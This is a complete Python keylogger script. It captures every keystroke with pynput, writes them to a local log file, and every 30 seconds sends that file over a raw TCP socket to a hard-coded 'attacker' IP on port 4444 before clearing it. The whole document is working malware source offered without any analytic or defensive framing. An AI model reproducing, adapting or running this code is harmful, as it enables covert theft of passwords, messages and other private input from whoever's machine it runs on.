import os
import time
import logging
import socket
from pynput import keyboard
import threading

# Save logs in the same directory as script
log_file = os.path.join(os.getcwd(), "keylogs.txt")

# Configure logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Attacker details
ATTACKER_IP = "192.168.149.172"
PORT = 4444

def on_press(key):
    try:
        key_str = str(key).replace("'", "")
        print(f"Key Pressed: {key_str}") # Debugging output
        logging.info(key_str)

        # Write to file immediately
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(key_str + "\n")

    except Exception as e:
        print(f"Error: {e}")

def run_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def send_logs():
    """
    Sends logs every 30 seconds to the attack machine
    """
    while True:
        try:
            if os.path.exists(log_file):
                with open(log_file, "rb") as f:
                    log_data = f.read()

                if log_data:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.connect((ATTACKER_IP, PORT))
                        s.sendall(log_data)
                        print("[+] Logs sent successfully")

                    # Clear the log file after sending
                    open(log_file, "w").close()

        except Exception as e:
            print(f"[-] Error sending logs: {e}")

        time.sleep(30) # Wait 30 seconds before sending again

if __name__ == '__main__':
    # Run keylogger and log sender in parallel
    threading.Thread(target=run_keylogger, daemon=True).start()
    threading.Thread(target=send_logs, daemon=True).start()

    while True:
        time.sleep(10) # Keep the main thread alive
